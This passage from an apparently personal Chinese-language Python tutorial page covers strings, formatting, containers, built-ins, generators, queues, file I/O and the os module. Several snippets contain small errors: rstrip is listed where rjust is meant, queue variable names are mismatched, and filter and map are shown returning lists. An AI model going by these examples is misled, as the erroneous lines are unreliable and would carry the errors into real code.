<td><code>\0</code></td>
<td>空</td>
<td><code>\n</code></td>
<td>换行</td>
<td><code>\v</code></td>
<td>纵向制表符</td>
</tr>
<tr>
<td><code>\r</code></td>
<td>回车</td>
<td><code>\f</code></td>
<td>换页</td>
<td><code>\t</code></td>
<td>横向制表符</td>
</tr>
<tr>
<td><code>\oYY</code></td>
<td>八进制</td>
<td><code>\xYY</code></td>
<td>十六进制</td>
<td></td>
<td></td>
</tr>
</tbody></table>
<h4 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h4><ul>
<li>join()：连接字符串</li>
<li>split()：分隔字符串，返回列表</li>
<li>count(s)：返回子串s出现次数</li>
<li>len()：返回字符串长度</li>
<li>strip()：去掉两边空格</li>
<li>find()：查找子串位置，未找到返回 -1</li>
<li>replace(old, new)：替换子串</li>
<li>bytes.decode(encoding&#x3D;’UTF-8’,errors&#x3D;’strict’)：解码为字符串</li>
<li>encode(encoding&#x3D;’UTF-8’,errors&#x3D;’strict’)：编码为二进制数据</li>
<li>ljust(width, fillchar)：左对齐，返回填充后的字符串</li>
<li>rstrip(width, fillchar)：右对齐，返回填充后的字符串</li>
<li>center(width, fillchar)：居中对齐，返回填充后的字符串</li>
</ul>
<h4 id="原始格式化字符串"><a href="#原始格式化字符串" class="headerlink" title="原始格式化字符串"></a>原始格式化字符串</h4><p>原始格式化字符串：</p>
<ul>
<li>%c：字符</li>
<li>%s：字符串</li>
<li>%d：整数</li>
<li>%u：无符号整数</li>
<li>%o：无符号八进制</li>
<li>%x：无符号十六进制</li>
<li>%X：无符号十六进制（大写）</li>
<li>%f：浮点，可以指定小数点后位数</li>
<li>%e：科学计数法</li>
<li>%E：科学计数法</li>
<li>%g：作用同%f%e</li>
<li>%G：作用同%f%E</li>
<li>%p：变量地址</li>
</ul>
<p>例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;%s use python %f&quot; % (&#x27;User&#x27;, 3.7)</span><br></pre></td></tr></table></figure>

<p>辅助指令：</p>
<ul>
<li><code>*</code>：定义宽度或小数点精度</li>
<li><code>-</code>：左对齐</li>
<li><code>+</code>：在正数前面显示加号</li>
<li><code>&lt;sp&gt;</code>：在正数前面显示空格</li>
<li><code>#</code>：在八进制数前面显示零(‘0’)，在十六进制前面显示’0x’或者’0X’(取决于用的是’x’还是’X’)</li>
<li><code>0</code>：显示的数字前面填充’0’而不是默认的空格</li>
<li><code>%</code>：’%%’输出一个单一的’%’</li>
<li><code>var</code>：映射变量(字典参数)</li>
<li><code>m.n.</code>：m 是显示的最小总宽度,n 是小数点后的位数</li>
</ul>
<p><a href="https://www.runoob.com/python3/python3-string.html">参考</a></p>
<h4 id="增强型格式化字符串"><a href="#增强型格式化字符串" class="headerlink" title="增强型格式化字符串"></a>增强型格式化字符串</h4><p>增强型写法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 指定输出位置</span><br><span class="line">&quot;&#123;1&#125; &#123;0&#125; &#123;1&#125;&quot;.format(&quot;hello&quot;, &quot;world&quot;)</span><br><span class="line"># 输出</span><br><span class="line">&#x27;world hello world&#x27;</span><br><span class="line"></span><br><span class="line"># 指定输出</span><br><span class="line">&quot;姓名：&#123;name&#125;, 年龄 &#123;age&#125;&quot;.format(name=&quot;John&quot;, age=3)</span><br><span class="line"># 输出列表</span><br><span class="line">my_list = [&#x27;First&#x27;, &#x27;Second&#x27;]</span><br><span class="line">print(&quot;姓：&#123;0[0]&#125;, 名 &#123;0[1]&#125;&quot;.format(my_list))</span><br><span class="line"># 格式化输出</span><br><span class="line">&quot;&#123;:.2f&#125;&quot;.format(3.1415926)  # 输出 3.14</span><br><span class="line"># 转义输出</span><br><span class="line">&quot;&#123;&#123;&#125;&#125;&quot;.format()  # 输出 &#123;&#125;</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>格式</th>
<th>描述</th>
<th>格式</th>
<th>描述</th>
<th>格式</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><code>&#123;:.2f&#125;</code></td>
<td>保留小数点后两位</td>
<td><code>&#123;:+.2f&#125;</code></td>
<td>带符号保留</td>
<td><code>&#123;:.0f&#125;</code></td>
<td>不带小数</td>
</tr>
<tr>
<td><code>&#123;:0&gt;2d&#125;</code></td>
<td>数字补零 (填充左边, 宽度为2)</td>
<td><code>&#123;:x&lt;4d&#125;</code></td>
<td>数字补x (填充右边, 宽度为4)</td>
<td><code>&#123;:x&lt;4d&#125;</code></td>
<td>数字补x (填充右边, 宽度为4)</td>
</tr>
<tr>
<td><code>&#123;:,&#125;</code></td>
<td>以逗号分隔</td>
<td><code>&#123;:.2%&#125;</code></td>
<td>百分比格式</td>
<td><code>&#123;:.2e&#125;</code></td>
<td>指数记法</td>
</tr>
<tr>
<td><code>&#123;:&gt;10d&#125;</code></td>
<td>右对齐</td>
<td><code>&#123;:&lt;10d&#125;</code></td>
<td>左对齐</td>
<td><code>&#123;:^10d&#125;</code></td>
<td>中间对齐</td>
</tr>
</tbody></table>
<p><a href="https://www.runoob.com/python/att-string-format.html">参考</a></p>
<h4 id="f-string"><a href="#f-string" class="headerlink" title="f-string"></a>f-string</h4><p>Python 3.6 新增写法：字符串以<code>f</code>开头，字符串中的变量将会自动运算解析为结果。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">f&#x27;Hello &#123;name&#125;&#x27;</span><br><span class="line">f&#x27;&#123;1+2&#125;&#x27;</span><br><span class="line">f&#x27;&#123;w[&quot;name&quot;]&#125;: &#123;w[&quot;age&quot;]&#125;&#x27;</span><br></pre></td></tr></table></figure>

<p>f-string 使用<code>&#123;content:format&#125;</code>设置字符串格式。其中 content 是替换并填入字符串的内容，可以是变量、表达式或函数等，format 是格式描述符。</p>
<table>
<thead>
<tr>
<th>格式</th>
<th>描述</th>
<th>格式</th>
<th>描述</th>
<th>格式</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><code>&lt;</code></td>
<td>左对齐</td>
<td><code>&gt;</code></td>
<td>右对齐</td>
<td><code>^</code></td>
<td>居中</td>
</tr>
<tr>
<td><code>+</code></td>
<td>加正负号</td>
<td><code>-</code></td>
<td>负数加负号</td>
<td><code>空格</code></td>
<td>正数加空格，负数加负号</td>
</tr>
<tr>
<td><code>#</code></td>
<td>进制数切换数字显示方式</td>
<td><code>width</code></td>
<td>指定数字宽度</td>
<td><code>0width</code></td>
<td>指定宽度并高位补0</td>
</tr>
<tr>
<td><code>width.precision</code></td>
<td>宽度.显示精度</td>
<td><code>,</code></td>
<td>千位分隔符</td>
<td><code>_</code></td>
<td>千位分隔符</td>
</tr>
<tr>
<td><code>b/c/d/o/x</code></td>
<td>进制显示方式</td>
<td><code>s</code></td>
<td>字符串</td>
<td><code>e/E/f/F/g/G/%</code></td>
<td>浮点数显示方式</td>
</tr>
<tr>
<td><code>%a/%A/%w/%u</code></td>
<td>星期</td>
<td><code>%d</code></td>
<td>日</td>
<td><code>%b/%B/%m</code></td>
<td>月</td>
</tr>
<tr>
<td><code>%y/%Y</code></td>
<td>年</td>
<td><code>%H/%I</code></td>
<td>小时</td>
<td><code>%p</code></td>
<td>上下午</td>
</tr>
<tr>
<td><code>%M/%S/%f</code></td>
<td>分钟，秒，微秒</td>
<td><code>%j</code></td>
<td>一年的第几天</td>
<td><code>%z</code></td>
<td>UTC偏移量</td>
</tr>
</tbody></table>
<p>例如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c = 12345678</span><br><span class="line">f&#x27;c is &#123;c:015,d&#125;&#x27;   # &#x27;c is 000,012,345,678&#x27;</span><br><span class="line"></span><br><span class="line">e = datetime.datetime.today()</span><br><span class="line">f&#x27;the time is &#123;e:%Y-%m-%d (%a) %H:%M:%S&#125;&#x27;</span><br></pre></td></tr></table></figure>

<h4 id="Unicode-字符串"><a href="#Unicode-字符串" class="headerlink" title="Unicode 字符串"></a>Unicode 字符串</h4><p>在Python2中，普通字符串是以8位ASCII码进行存储的，而Unicode字符串则存储为16位unicode字符串，这样能够表示更多的字符集。使用的语法是在字符串前面加上前缀 u。</p>
<p>在Python3中，所有的字符串都是Unicode字符串。</p>
<h3 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h3><p>列表中的元素的类型可以不同。</p>
<p>运算方式有（设<code>list_a=[1, 2, &quot;a&quot;, True]</code>）：</p>
<ul>
<li>加(<code>list_a + list_b</code>)：列表拼接。</li>
<li>乘(<code>list_a * 2</code>)：列表重复。</li>
<li>切片(<code>list_a[0:-1]</code>, <code>list_a[3:]</code>)：返回列表<code>[1, 2, &quot;a&quot;]</code>，<code>[True]</code>。</li>
</ul>
<p>常用方法：</p>
<ul>
<li>count()：统计某元素出现次数</li>
<li>len()：返回元素个数</li>
<li>append()：在末尾添加元素</li>
<li>pop(n)：移除第n个元素，默认最后一个</li>
<li>index()：返回该元素的索引</li>
<li>insert()：插入一个元素</li>
<li>extend()：在末尾追加另一个列表的所有元素</li>
<li>remove()：移除第一个此元素</li>
<li>reverse()：翻转列表</li>
<li>sort()：元素排序</li>
<li>clear()：清空</li>
<li>copy()：复制</li>
<li>del list[x]：删除第x个元素</li>
</ul>
<p>内置函数：</p>
<ul>
<li>filter：过滤函数</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def is_odd(n):</span><br><span class="line">    return n % 2 == 1</span><br><span class="line"> </span><br><span class="line">newlist = filter(is_odd, [1, 2, 3, 4, 5, 6, 7, 8, 9, 10])</span><br><span class="line">print(newlist)  # [1, 3, 5, 7, 9]</span><br></pre></td></tr></table></figure>

<ul>
<li>map：映射函数</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def square(x):</span><br><span class="line">    return x ** 2</span><br><span class="line"></span><br><span class="line">map(square, [1,2,3,4,5])  # [1, 4, 9, 16, 25]</span><br><span class="line">map(lambda x: x ** 2, [1, 2, 3, 4, 5])  # 使用 lambda 匿名函数</span><br></pre></td></tr></table></figure>

<ul>
<li>reduce：累积函数</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def add(x, y) :            # 两数相加</span><br><span class="line">     return x + y</span><br><span class="line"> </span><br><span class="line">reduce(add, [1,2,3,4,5])   # 计算列表和：1+2+3+4+5=15</span><br><span class="line">reduce(lambda x, y: x+y, [1,2,3,4,5])  # 使用 lambda 匿名函数</span><br></pre></td></tr></table></figure>

<h3 id="元组"><a href="#元组" class="headerlink" title="元组"></a>元组</h3><p>元组的元素不可修改。 元组中的元素的类型可以不同。 如果元组包含了对象，那么对象是可以修改的。 构造空元组写作<code>tup1 = ()</code>，构造单元素元组<code>tup2 = (20,)</code>，注意有逗号。</p>
<p>运算方式有（设<code>tuple_a=(1, 2, &quot;a&quot;, True)</code>）：</p>
<ul>
<li>加(<code>tuple_a + tuple_b</code>)：元组拼接。</li>
<li>乘(<code>tuple_a * 2</code>)：元组重复。</li>
<li>切片(<code>tuple_a[0:-1]</code>, <code>tuple_a[3:]</code>)：返回元组<code>(1, 2, &quot;a&quot;)</code>，<code>(True)</code>。</li>
</ul>
<h3 id="集合"><a href="#集合" class="headerlink" title="集合"></a>集合</h3><p>集合中的元素类型必须一致。 集合中的元素不能重复。 创建一个空集合必须使用<code>set()</code>。</p>
<p>运算方式有：</p>
<ul>
<li>求差集(a - b)</li>
<li>求并集(a | b)</li>
<li>求交集(a &amp; b)</li>
<li>求二者中不同时拥有的元素(a ^ b)</li>
</ul>
<p>常用操作：</p>
<ul>
<li>add()：添加元素</li>
<li>update()：批量添加元素</li>
<li>remove()：移除元素，如果不存在，会报错</li>
<li>discard()：移除元素，如果不存在，不会报错</li>
<li>pop()：随机删除一个</li>
<li>len()：求元素个数</li>
<li>clear()：情况集合</li>
<li>x in s：判断使用包含元素</li>
</ul>
<h3 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h3><p>字典中的元素按照键值对存取。 字典中<code>Key</code>必须是不可变的数据类型（字符串，元组，常量）。 字典中<code>Key</code>值必须是唯一的。</p>
<p>常用操作：</p>
<ul>
<li>clear()：清空字典</li>
<li>copy()：浅拷贝</li>
<li>get()：返回某键的值，否则返回default值</li>
<li>key in dict：判断是否有该key</li>
<li>pop()：删除某个key</li>
</ul>
<h3 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h3><p>int()：转换为整型，可以接受：字符串，Bytes对象，数字。 float()：转换为浮点，可以接受：字符串，数字。 str()：转换为字符串，可接受几乎所有对象，转换结果适用于人类阅读。 repr()：转换为字符串，可接受几乎所有对象，转换结果适用于机器使用。 eval()：将字符串作为Python语句执行，返回执行结果。 tuple()：转化为元组，可以接受：列表，字符串等。 list()：转化为列表，可以接受：元组，字符串等。 set()：转化为集合。 dict()：转化为字典，可以接受：(key, value)的序列。 chr()：整数转化为字符。 ord()：字符转整数。 unichr()：整数转换为Unicode字符。 hex()：整数转十六进制字符串。 oct()：整数转八进制字符串。</p>
<p>chr()：将数字按照ASCII转化为字符 ord()：转换ASCII字符为整数 bytearray()：返回一个Byte数组，参数是整数n，则初始化数组长度为n；如果是字符串，则将字符串转换为Bytes compile(source, filename, mode)：将字符串编译为字节码，mode可以为exec、eval、single</p>
<h3 id="类型注解"><a href="#类型注解" class="headerlink" title="类型注解"></a>类型注解</h3><p>在Python中，我们创建变量，传递变量是不需要注明类型的。但是这也造成了不便。因此 Python 3 提供了类型注解的功能，来表明变量类型。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># x:int 注明x是一个int型变量，-&gt; 指明了返回值类型为int</span><br><span class="line">def add(x:int, y:int) -&gt; int:</span><br><span class="line">    # 声明一个int行变量，并赋值</span><br><span class="line">    z:int = 10</span><br><span class="line">    return x + y</span><br></pre></td></tr></table></figure>

<h3 id="内置函数"><a href="#内置函数" class="headerlink" title="内置函数"></a>内置函数</h3><p>input()：标准输入 print()：标准输出</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 输出的结尾：以逗号结尾，默认是以换行结尾</span><br><span class="line">print(end=&#x27;,&#x27;)</span><br><span class="line"># 输出对象间隔号：以逗号间隔，默认是空格</span><br><span class="line">print(sep=&#x27;,&#x27;)</span><br><span class="line"># 输出到文件</span><br><span class="line">print(file=&#x27;&#x27;)</span><br><span class="line"># 是否强制刷新流</span><br><span class="line">print(flush=&#x27;,&#x27;)</span><br></pre></td></tr></table></figure>

<p>exec()：执行Python语句，无返回值 eval()：将给定表达式用Python执行，并返回执行结果 execfile(filename)：执行一个文件，返回执行结果 file()：创建一个FILE对象，同open() memoryview()：查看对象的在内存的存储形式，对使用缓冲区的地方非常友好，尤其是对str与bytearray</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a = &#x27;aaaaaa&#x27;</span><br><span class="line">ma = memoryview(a)</span><br><span class="line">ma.readonly  # True，只读的memoryview</span><br><span class="line">mb = ma[:2]  # 不会产生新的字符串</span><br><span class="line"></span><br><span class="line">a = bytearray(&#x27;aaaaaa&#x27;)</span><br><span class="line">ma = memoryview(a)</span><br><span class="line">ma.readonly      # False，可写的memoryview</span><br><span class="line">mb = ma[:2]      # 不会会产生新的bytearray</span><br><span class="line">mb[:2] = &#x27;bb&#x27;    # 对mb的改动就是对ma的改动</span><br><span class="line">mb.tobytes()     # &#x27;bb&#x27; </span><br><span class="line">ma.tobytes()     # &#x27;bbaaaa&#x27;</span><br></pre></td></tr></table></figure>

<p>globals()：返回当前位置的全局变量，字典形式 locals()：返回当前位置的局部变量，字典形式</p>
<p>id()：获取对象的内存地址 hash()：返回对象的哈希值 super()：调用父类 vars()：将对象转化为字典</p>
<p>reload()：重新加载模块 <code>__import__</code>()：动态加载类或模块 help()：查看模块或函数的帮助信息</p>
<h3 id="查看类型"><a href="#查看类型" class="headerlink" title="查看类型"></a>查看类型</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">type(x)  # 查看变量的类型，子类与父类不一致。</span><br><span class="line">isinstance(x, int)  # 查看变量是否是某种类型，子类和父类被认为一直。</span><br><span class="line">issubclass(father, son)  # 判断是否为子类</span><br></pre></td></tr></table></figure>

<h2 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h2><h3 id="for-循环"><a href="#for-循环" class="headerlink" title="for 循环"></a>for 循环</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 遍历列表</span><br><span class="line">for x in x_list:</span><br><span class="line">    pass</span><br><span class="line"># 遍历字符串</span><br><span class="line">for c in &quot;abcdefg&quot;:</span><br><span class="line">    pass</span><br><span class="line"># 带索引遍历</span><br><span class="line">for i, name in enumerate(name_list, start_index):</span><br><span class="line">    print(f&#x27;index is &#123;i&#125;,name is &#123;name&#125;&#x27;)</span><br><span class="line"># 打包成元组遍历 a = [1,2,3], c = [4,5,6,7,8], zip(a,c) --&gt; [(1, 4), (2, 5), (3, 6)]</span><br><span class="line">for i in zip(albums, years):</span><br><span class="line">    print(i)</span><br><span class="line"># 单行 for 循环</span><br><span class="line">s.split() for s in sentence</span><br><span class="line"># 相当于</span><br><span class="line">for s in sentence:</span><br><span class="line">    s.split()</span><br><span class="line"># 遍历字典</span><br><span class="line">for k, v in knights.items():</span><br><span class="line">    print(k, v)</span><br><span class="line"># 遍历排序后的集合</span><br><span class="line">for f in sorted(set(basket)):</span><br><span class="line">    print(f)</span><br></pre></td></tr></table></figure>

<h3 id="迭代器"><a href="#迭代器" class="headerlink" title="迭代器"></a>迭代器</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">list=[1,2,3,4]</span><br><span class="line">it = iter(list)    # 创建迭代器对象</span><br><span class="line">for x in it:</span><br><span class="line">    print (x, end=&quot; &quot;)</span><br><span class="line">it = iter(list)    # 创建迭代器对象</span><br><span class="line">print (next(it))   # 输出迭代器的下一个元素</span><br><span class="line">print (next(it))   # 输出迭代器的下一个元素</span><br></pre></td></tr></table></figure>

<p>StopIteration 异常用于标识迭代的完成，防止出现无限循环的情况，在 <code>__next__()</code> 方法中我们可以设置在完成指定循环次数后触发 StopIteration 异常来结束迭代。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class MyNumbers:</span><br><span class="line">  def __iter__(self):</span><br><span class="line">    self.a = 1</span><br><span class="line">    return self</span><br><span class="line"> </span><br><span class="line">  def __next__(self):</span><br><span class="line">    if self.a &lt;= 20:</span><br><span class="line">      x = self.a</span><br><span class="line">      self.a += 1</span><br><span class="line">      return x</span><br><span class="line">    else:</span><br><span class="line">      raise StopIteration</span><br><span class="line"> </span><br><span class="line">myclass = MyNumbers()</span><br><span class="line">myiter = iter(myclass)</span><br><span class="line"> </span><br><span class="line">for x in myiter:</span><br><span class="line">  print(x)</span><br></pre></td></tr></table></figure>

<p>在 Python 中，使用了 yield 的函数被称为生成器。</p>
<p>跟普通函数不同的是，生成器是一个返回迭代器的函数，只能用于迭代操作，更简单点理解生成器就是一个迭代器。</p>
<p>在调用生成器运行的过程中，每次遇到 yield 时函数会暂停并保存当前所有的运行信息，返回 yield 的值, 并在下一次执行 next() 方法时从当前位置继续运行。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line"> </span><br><span class="line">def fibonacci(n): # 生成器函数 - 斐波那契</span><br><span class="line">    a, b, counter = 0, 1, 0</span><br><span class="line">    while True:</span><br><span class="line">        if (counter &gt; n): </span><br><span class="line">            return</span><br><span class="line">        yield a</span><br><span class="line">        a, b = b, a + b</span><br><span class="line">        counter += 1</span><br><span class="line">f = fibonacci(10) # f 是一个迭代器，由生成器返回生成</span><br><span class="line"> </span><br><span class="line">while True:</span><br><span class="line">    try:</span><br><span class="line">        print (next(f), end=&quot; &quot;)</span><br><span class="line">    except StopIteration:</span><br><span class="line">        sys.exit()</span><br></pre></td></tr></table></figure>

<h3 id="不定长传参"><a href="#不定长传参" class="headerlink" title="不定长传参"></a>不定长传参</h3><p>转为元组传入 <code>*</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def printinfo( arg1, *vartuple ):</span><br></pre></td></tr></table></figure>

<p>转为字典传入 <code>**</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def printinfo( arg1, **var_args_dict ):</span><br></pre></td></tr></table></figure>

<h3 id="匿名函数"><a href="#匿名函数" class="headerlink" title="匿名函数"></a>匿名函数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sum = lambda arg1, arg2: arg1 + arg2</span><br></pre></td></tr></table></figure>

<h3 id="强制位置参数"><a href="#强制位置参数" class="headerlink" title="强制位置参数"></a>强制位置参数</h3><p><code>/</code>前面的参数不能使用关键字参数。 <code>*</code>后面的参数必须使用关键字参数。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def f(a, b, /, c, d, *, e, f):</span><br><span class="line">    print(a, b, c, d, e, f)</span><br></pre></td></tr></table></figure>

<h3 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h3><h4 id="堆栈"><a href="#堆栈" class="headerlink" title="堆栈"></a>堆栈</h4><p>可以使用列表作为堆栈。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">stack = [1, 2, 3]</span><br><span class="line">stack.append(4)</span><br><span class="line">x = stack.pop()</span><br></pre></td></tr></table></figure>

<p>可以使用模块。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from queue import LifoQueue</span><br><span class="line">stack = LifoQueue()</span><br><span class="line">stack.put(1)</span><br><span class="line">while not stack.empty():</span><br><span class="line">    x = stack.get()</span><br></pre></td></tr></table></figure>

<h4 id="队列"><a href="#队列" class="headerlink" title="队列"></a>队列</h4><p>使用列表作为队列，但是效率不高。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">que = [1, 2, 3]</span><br><span class="line">que.append(4)</span><br><span class="line">x = stack.popleft()</span><br></pre></td></tr></table></figure>

<p>可以使用模块。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from queue import Queue</span><br><span class="line">que = Queue()</span><br><span class="line">q.put(1)</span><br><span class="line">while not q.empty():</span><br><span class="line">    x = q.get()</span><br></pre></td></tr></table></figure>

<h4 id="优先队列"><a href="#优先队列" class="headerlink" title="优先队列"></a>优先队列</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from queue import PriorityQueue</span><br><span class="line">q = PriorityQueue()</span><br><span class="line">q.put(Task(5, &#x27;Mid-level job&#x27;))</span><br><span class="line">while not q.empty():</span><br><span class="line">    next_job = q.get()</span><br><span class="line"></span><br><span class="line">class Task(object):</span><br><span class="line">    def __init__(self, priority, description):</span><br><span class="line">        self.priority = priority</span><br><span class="line">        self.description = description</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    # 运算符重载</span><br><span class="line">    def __lt__(self, other):</span><br><span class="line">        return self.priority &lt; other.priority</span><br></pre></td></tr></table></figure>

<h4 id="列表推导式"><a href="#列表推导式" class="headerlink" title="列表推导式"></a>列表推导式</h4><p>可以方便用于创建列表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vec1 = [2, 4, 6]</span><br><span class="line">vec2 = [4, 3, -9]</span><br><span class="line">[3*x for x in vec1]                # [6, 12, 18]</span><br><span class="line">[x*y for x in vec1 for y in vec2]  # [8, 6, -18, 16, 12, -36, 24, 18, -54]</span><br></pre></td></tr></table></figure>

<h3 id="模块与包"><a href="#模块与包" class="headerlink" title="模块与包"></a>模块与包</h3><p><code>__name__</code>属性来使该程序块仅在该模块自身运行时执行。</p>
<p>dir() 函数可以找到模块内定义的所有名称。以一个字符串列表的形式返回：</p>
<p>包：管理 Python 模块命名空间的形式，如sound包下的effects包下的echo模块，使用方法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import sound.effects.echo</span><br></pre></td></tr></table></figure>

<p>对应的目录结构为：</p>
<ul>
<li>sound&#x2F;<ul>
<li><code>__init__.py</code></li>
<li>effects&#x2F;<ul>
<li><code>__init__.py</code></li>
<li>echo.py</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>包的下面必须有<code>__init__.py</code>文件（可以是空文件），否则将不会识别为包。</p>
<p>如果包定义文件 <code>__init__.py</code> 存在一个叫做 <code>__all__</code> 的列表变量，那么在使用 from package import * 的时候就把这个列表中的所有名字作为包内容导入。</p>
<h3 id="读写文件"><a href="#读写文件" class="headerlink" title="读写文件"></a>读写文件</h3><p>使用<code>open()</code>可以打开文件，其完整的参数表为：</p>
<ul>
<li>file: 必需，文件路径（相对或者绝对路径）。</li>
<li>mode: 可选，文件打开模式</li>
<li>buffering: 设置缓冲</li>
<li>encoding: 一般使用utf8</li>
<li>errors: 报错级别</li>
<li>newline: 区分换行符</li>
<li>closefd: 传入的file参数类型</li>
<li>opener:</li>
</ul>
<p>mode指定了文件打开模式，默认为只读，常见方式有：</p>
<table>
<thead>
<tr>
<th>模式</th>
<th>描述</th>
<th>模式</th>
<th>描述</th>
<th>模式</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>x</td>
<td>写模式，文件已存在则报错</td>
<td>b</td>
<td>二进制</td>
<td>+</td>
<td>读写</td>
</tr>
<tr>
<td>r</td>
<td>只读</td>
<td>rb</td>
<td>只读，二进制</td>
<td>r+</td>
<td>读写</td>
</tr>
<tr>
<td>rb+</td>
<td>读写，二进制</td>
<td>w</td>
<td>只写</td>
<td>wb</td>
<td>只写，二进制</td>
</tr>
<tr>
<td>w+</td>
<td>读写</td>
<td>wb+</td>
<td>读写，二进制</td>
<td>a</td>
<td>追加写</td>
</tr>
<tr>
<td>ab</td>
<td>追加写，二进制</td>
<td>a+</td>
<td>追加读写</td>
<td>ab+</td>
<td>追加读写，二进制</td>
</tr>
</tbody></table>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">f = open(filename)</span><br><span class="line"># 读取n个字符或字节，默认是全部内容</span><br><span class="line">f.read(n)</span><br><span class="line"># 读取一行，如果为空，说明已经最后一行了</span><br><span class="line">f.readline()</span><br><span class="line"># 读取所有行</span><br><span class="line">f.readlines()</span><br><span class="line"># 写入</span><br><span class="line">f.write(data)</span><br><span class="line"># 返回当前指针位置</span><br><span class="line">f.tell()</span><br><span class="line"># 移动指针位置：0 从开头向后移动m个字节，1 从当前位置向后移动m个字节，2 从结尾向后移动m个字节</span><br><span class="line">f.seek(m, 0)</span><br><span class="line"># 获取文件描述符</span><br><span class="line">f.fileno()</span><br><span class="line"># 判断是否为终端设备</span><br><span class="line">f.isatty()</span><br><span class="line"># 刷新缓冲区到文件</span><br><span class="line">f.flush()</span><br><span class="line"># 关闭文件，释放资源</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>

<p>如果觉得打开文件再关闭文件操作繁琐，Python还提供了<code>with as</code>功能，可以打开后不管释放：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 执行完毕自动释放</span><br><span class="line">with open(&quot;/tmp/file.txt&quot;) as file:</span><br><span class="line">    data = file.read()</span><br></pre></td></tr></table></figure>

<p>with语句不仅可以用来操作文件，线程等资源也可以使用。</p>
<p>pickle模块，可以用来序列化和反序列化对象。利用这个模块，我们可以用来保存数据结构到文件中。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import pickle</span><br><span class="line"></span><br><span class="line">pickle.dump(obj, file)</span><br><span class="line">x = pickle.load(file)</span><br></pre></td></tr></table></figure>

<h3 id="OS-模块"><a href="#OS-模块" class="headerlink" title="OS 模块"></a>OS 模块</h3><p>目录与权限：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 检验权限模式，尝试使用UserID，GroupID访问目录，检验是否有权限访问。mode：</span><br><span class="line"># os.F_OK 测试path是否存在。</span><br><span class="line"># os.R_OK 测试path是否可读。</span><br><span class="line"># os.W_OK 测试path是否可写。</span><br><span class="line"># os.X_OK 测试path是否可执行。</span><br><span class="line">os.access(path, mode)</span><br><span class="line"></span><br><span class="line"># 更改当前进程的看到的根目录</span><br><span class="line"># 例如 os.chroot(&#x27;/tmp&#x27;)</span><br><span class="line"># 则 对于进程&#x27;/&#x27;目录就是系统的&#x27;/tmp&#x27;目录</span><br><span class="line">os.chroot(path)</span><br><span class="line"></span><br><span class="line"># 切换工作目录</span><br><span class="line">os.chdir(path)</span><br><span class="line"># 获取工作目录</span><br><span class="line">os.getcwd()</span><br><span class="line"></span><br><span class="line"># 更改权限</span><br><span class="line">os.chmod(path, mode)</span><br><span class="line"># 更改文件所有者</span><br><span class="line">os.chown(path, uid, gid)</span><br><span class="line"></span><br><span class="line"># 获取路劲下的文件和文件夹</span><br><span class="line">os.listdir(path)</span><br><span class="line"># 创建路径，mode为权限 0o755</span><br><span class="line">os.makedirs(path[, mode])</span><br><span class="line"># 删除路径为path的文件</span><br><span class="line">os.remove(path)</span><br><span class="line"># 删除空目录，如果非空则异常</span><br><span class="line">os.rmdir(path)</span><br><span class="line"># 重命名</span><br><span class="line">os.rename(src, dst)</span><br><span class="line"># 获取path信息</span><br><span class="line">os.stat(path)</span><br><span class="line"># 获取文件系统信息</span><br><span class="line">os.statvfs(path)</span><br></pre></td></tr></table></figure>

<p>文件：</p>
